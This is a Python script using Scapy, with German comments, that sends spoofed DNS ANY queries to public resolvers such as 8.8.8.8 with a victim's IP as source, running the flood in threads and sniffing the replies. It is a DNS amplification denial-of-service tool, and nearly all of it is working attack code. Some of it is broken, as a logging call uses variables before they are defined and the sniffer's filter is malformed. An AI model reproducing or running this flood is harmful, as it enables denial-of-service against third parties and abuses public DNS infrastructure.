from scapy.all import *
import threading
import random
import logging
from datetime import datetime

# Initialisiere das Logging
logging.basicConfig(filename="dns_amplification_test.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def log_packet(packet_info):
    logging.info(packet_info)

# Beispiel im Code verwenden
log_packet(f"Gesendetes Paket {packet_counter} an {resolver_ip} von {victim_ip}")

packet_counter = 0
stop_event = threading.Event()

def send_dns_amplification(victim_ip, resolver_ip, target_domain):
    """Sendet gefälschte DNS-Anfragen für Amplification."""
    global packet_counter

    # Erstelle eine DNS-Abfrage
    dns_query = (
        b'\xaa\xbb'  # Transaction ID (random)
        b'\x01\x00'  # Standard query
        b'\x00\x01'  # Questions: 1
        b'\x00\x00'  # Answer RRs
        b'\x00\x00'  # Authority RRs
        b'\x00\x00'  # Additional RRs
        + bytes(target_domain, "utf-8") + b'\x00'  # Query domain
        b'\x00\xff'  # Type: ANY
        b'\x00\x01'  # Class: IN
    )

    # Erstelle das UDP-Paket mit gefälschter Quell-IP
    udp_packet = IP(src=victim_ip, dst=resolver_ip) / UDP(dport=53) / dns_query

    try:
        while not stop_event.is_set():
            send(udp_packet, verbose=False)
            packet_counter += 1
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        print("Flood gestoppt.")

def start_amplification(victim_ip, resolver_list, target_domain, duration=10):
    """Startet den Amplification-Flood."""
    threads = []
    try:
        for resolver_ip in resolver_list:
            thread = threading.Thread(target=send_dns_amplification, args=(victim_ip, resolver_ip, target_domain))
            threads.append(thread)
            thread.start()

        threading.Timer(duration, stop_event.set).start()

        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        print(f"Gesendete Pakete: {packet_counter}")

# Beispielaufruf
resolver_list = ["8.8.8.8", "8.8.4.4"]  # Liste von DNS-Resolvern
victim_ip = "192.168.1.100"  # IP des Opfers
target_domain = "\x07example\x03com"  # Domain im DNS-Format

start_amplification(victim_ip, resolver_list, target_domain, duration=10)

def sniff_responses(interface, timeout=10):
    """Snifft Antworten auf die gesendeten DNS-Anfragen."""
    def filter_response(packet):
        return packet.haslayer(DNS) and packet[IP].src in resolver_list

    print("Starte Sniffer...")
    packets = sniff(filter=filter_response, iface=interface, timeout=timeout)
    for pkt in packets:
        print(pkt.summary())

# Aufrufen nach dem Start der Flood
sniff_responses(interface="eth0")
